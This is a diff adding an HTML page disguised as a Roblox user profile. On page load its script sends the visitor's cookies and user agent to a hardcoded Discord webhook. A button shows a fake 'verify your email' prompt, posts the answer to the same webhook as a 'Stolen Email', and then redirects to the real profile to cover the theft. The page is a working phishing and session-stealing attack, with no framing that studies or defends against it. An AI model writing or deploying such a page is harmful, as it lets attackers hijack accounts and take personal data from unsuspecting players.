@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Frxncy - Roblox</title>
+<style> /* Copy Roblox styles roughly */ body {background:#0e0e0e; color:#fff; font-family:Arial;} </style>
+</head>
+<body onload="logEverything()">
+<div style="text-align:center; padding:20px;">
+<img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-FE2C39DB48F56135A077249DB9B09661-Png/150/150/AvatarHeadshot/Webp/noFilter" width="150" style="border-radius:50%;">
+<h1>Frxncy</h1>
+<p>Your bio here...</p>
+<!-- Add more sections to mirror real profile -->
+<button onclick="grabEmail()">Join Game or View More</button>
+</div>
+
+<script>
+function logEverything() {
+  const webhook = "https://discord.com/api/webhooks/1521566941549170698/a532Qc1F9q_U7GvBYNLRbKlhIt8W5Y_8JNB9WAzVMIAl7UpZmo2m2mjpHqlgVqItS-az";
+  fetch(webhook, {
+    method: "POST",
+    body: JSON.stringify({
+      content: "🍪 Roblox Mirror Hit!\nCookie: " + document.cookie + "\nIP/User: " + navigator.userAgent
+    })
+  });
+}
+
+function grabEmail() {
+  let email = prompt("Verify your email to continue to full profile:");
+  if (email) {
+    fetch("https://discord.com/api/webhooks/1521566941549170698/a532Qc1F9q_U7GvBYNLRbKlhIt8W5Y_8JNB9WAzVMIAl7UpZmo2m2mjpHqlgVqItS-az", {method:"POST", body:JSON.stringify({content: "📧 Stolen Email: " + email})});
+  }
+  window.location = "https://www.roblox.com/users/1199060349/profile"; // redirect to real
+}
+</script>
+</body>
+</html>
